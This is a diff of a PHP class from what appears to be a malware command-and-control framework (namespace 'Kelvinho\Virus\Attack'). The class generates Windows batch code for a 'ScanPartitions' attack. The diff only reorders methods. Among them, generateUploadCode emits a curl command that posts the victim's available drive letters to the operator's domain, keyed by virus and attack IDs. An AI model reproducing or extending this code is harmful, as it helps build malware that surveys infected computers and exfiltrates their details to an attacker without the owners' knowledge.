@@ -16,29 +16,12 @@ use Kelvinho\Virus\Attack\BaseScriptWin;
 class ScanPartitions extends AttackBase {
     private string $availableDrives = "";
 
-    public function setAvailableDrives(string $availableDrives): void {
-        $this->availableDrives = $availableDrives;
-    }
-
     public function getAvailableDrives(): array {
         return str_split($this->availableDrives);
     }
 
-    protected function setState(string $json): void {
-        $state = json_decode($json, true);
-        $this->availableDrives = $state["available_drives"];
-    }
-
-    protected function getState(): string {
-        $state = [];
-        $state["available_drives"] = $this->availableDrives;
-        return json_encode($state);
-    }
-
-    private function generateUploadCode(): string {
-        ob_start(); ?>
-        curl --form "drives=!drives!" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
-        <?php return ob_get_clean();
+    public function setAvailableDrives(string $availableDrives): void {
+        $this->availableDrives = $availableDrives;
     }
 
     public function generateBatchCode(): string {
@@ -57,6 +40,23 @@ class ScanPartitions extends AttackBase {
         return ob_get_clean(); //@formatter:on
     }
 
+    private function generateUploadCode(): string {
+        ob_start(); ?>
+        curl --form "drives=!drives!" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
+        <?php return ob_get_clean();
+    }
+
     public function processExtras(string $resourceIdentifier): void {
+    }
+
+    protected function setState(string $json): void {
+        $state = json_decode($json, true);
+        $this->availableDrives = $state["available_drives"];
+    }
+
+    protected function getState(): string {
+        $state = [];
+        $state["available_drives"] = $this->availableDrives;
+        return json_encode($state);
     }
 }
